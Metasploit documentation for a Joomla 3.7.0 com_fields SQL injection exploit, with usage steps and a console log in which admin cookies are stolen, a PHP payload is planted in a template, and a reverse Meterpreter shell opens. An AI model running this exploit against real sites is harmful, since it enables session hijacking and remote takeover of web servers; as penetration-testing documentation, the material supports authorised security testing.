## Vulnerable Application

  This module exploits a SQL Injection vulnerability in the 'com_fields' component which was introduced to the core of Joomla in version 3.7.0.
  With the SQLi, it's possible to enumerate cookies of administrative users, and hijack one of their sessions. If no administrators are authenticated, the RCE portion will not work. If a session hijack is available, one of the website templates is identified, and our payload is added to the template as a new file, and then executed.

## Verification


  1. Start msfconsole
  2. Do: `use exploit/unix/webapp/joomla_comfields_sqli_rce`
  3. Do: `set rhost [ip]`
  4. Do: `set tageturi [uri]`
  5. Do: `exploit`
  6. Get a shell

## Scenarios

### Joomal 3.7.0 on Ubuntu 16.04 with another user authenticated as an administrator

```
msf > use exploit/unix/webapp/joomla_comfields_sqli_rce 
msf exploit(joomla_comfields_sqli_rce) > set rhost 1.2.3.4
rhost => 1.2.3.4
msf exploit(joomla_comfields_sqli_rce) > set TARGETURI joomla_demo
TARGETURI => joomla_demo
msf exploit(joomla_comfields_sqli_rce) > exploit

[*] Started reverse TCP handler on 1.2.3.4:4444 
[*] 192.168.0.15:80 - Retrieved table prefix [ l6crq ]
[*] 192.168.0.15:80 - Retrieved admin cookie [ 0nva1b7d2re73dojsakmq5gqs5 ]
[*] 192.168.0.15:80 - Retrieved unauthenticated cookie [ b41f947841f591f08bb4203036a1b7d3 ]
[+] 192.168.0.15:80 - Successfully authenticated as Administrator
[*] 192.168.0.15:80 - Creating file [ 4duqOQWjqycE1.php ]
[*] 192.168.0.15:80 - Following redirect to [ /joomla_demo/administrator/index.php?option=com_templates&view=template&id=503&file=LzRkdXFPUVdqcXljRTEucGhw ]
[*] 192.168.0.15:80 - Token [ cdec8f07a07e2810437f8f8a148b7628 ] retrieved
[*] 192.168.0.15:80 - Template path [ /templates/beez3/ ] retrieved
[*] 192.168.0.15:80 - Insert payload into file [ 4duqOQWjqycE1.php ]
[*] 192.168.0.15:80 - Payload data inserted into [ 4duqOQWjqycE1.php ]
[*] 192.168.0.15:80 - Executing payload
[*] Sending stage (37543 bytes) to 1.2.3.4
[*] Meterpreter session 1 opened (192.168.0.24:4444 -> 1.2.3.4:49586) at 2018-03-06 20:20:22 -0500
[+] Deleted 4duqOQWjqycE1.php

meterpreter > sysinfo
Computer    : luisco-VirtualBox
OS          : Linux luisco-VirtualBox 4.10.0-38-generic #42~16.04.1-Ubuntu SMP Tue Oct 10 16:32:20 UTC 2017 x86_64
Meterpreter : php/linux

```
